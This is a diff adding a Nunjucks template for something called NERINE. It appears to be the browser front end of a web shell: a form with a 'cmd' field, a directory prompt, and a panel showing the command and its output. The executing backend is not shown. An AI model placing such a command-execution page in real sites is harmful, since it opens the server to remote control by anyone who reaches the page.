@@ -1,0 +1,22 @@
+{% extends 'template.default.html.njk' %}
+
+{% block content %}
+<h1>NERINE {{ NERINE_VERSION }}</h1>
+
+<form method="POST">
+[{{ dirname }}]$
+<input type="text" name="cmd" style="width: 800px;">
+</form>
+
+{% if command %}
+<div>
+  [{{ dirname }}]$ {{ command }}
+</div>
+{% endif %}
+
+{% if commandResult %}
+<div style="font-family: monospace;">
+    {{ commandResult | escape | nl2br }}
+</div>
+{% endif %}
+{% endblock %}
